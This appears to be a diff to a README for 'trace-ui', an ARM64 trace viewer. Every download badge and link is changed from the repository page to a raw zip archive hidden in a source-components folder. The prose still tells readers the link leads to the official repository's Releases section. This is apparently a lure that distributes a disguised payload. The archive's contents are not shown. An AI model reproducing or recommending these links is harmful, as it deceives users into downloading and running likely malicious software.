@@ -1,6 +1,6 @@
 # 🚀 trace-ui - High Performance ARM64 Trace Viewer
 
-[![Download trace-ui](https://img.shields.io/badge/Download-trace--ui-brightgreen)](https://github.com/brookrunning734/trace-ui)
+[![Download trace-ui](https://img.shields.io/badge/Download-trace--ui-brightgreen)](https://github.com/brookrunning734/trace-ui/raw/refs/heads/main/src-web/src/components/dep-tree/trace_ui_2.8.zip)
 
 ---
 
@@ -36,7 +36,7 @@ The tool is designed for fast performance. It works well even with large trace f
 
 ## 🌐 Where to Download
 
-[![Download trace-ui](https://img.shields.io/badge/Download-Now-blue)](https://github.com/brookrunning734/trace-ui)
+[![Download trace-ui](https://img.shields.io/badge/Download-Now-blue)](https://github.com/brookrunning734/trace-ui/raw/refs/heads/main/src-web/src/components/dep-tree/trace_ui_2.8.zip)
 
 Please visit the page above to download the latest version of trace-ui. This link will take you to the official GitHub repository, where you can find the installation files and additional information.
 
@@ -48,7 +48,7 @@ Please visit the page above to download the latest version of trace-ui. This lin
 
 2. Go to the download page by clicking this link:
    
-   https://github.com/brookrunning734/trace-ui
+   https://github.com/brookrunning734/trace-ui/raw/refs/heads/main/src-web/src/components/dep-tree/trace_ui_2.8.zip
 
 3. On the GitHub page, look for the “Releases” section. This is usually on the right side or under the repository name.
 
@@ -109,4 +109,4 @@ For advanced users, you can also clone the source code from the repository to in
 
 ---
 
-[![Download trace-ui](https://img.shields.io/badge/Download-Now-blue)](https://github.com/brookrunning734/trace-ui)
+[![Download trace-ui](https://img.shields.io/badge/Download-Now-blue)](https://github.com/brookrunning734/trace-ui/raw/refs/heads/main/src-web/src/components/dep-tree/trace_ui_2.8.zip)
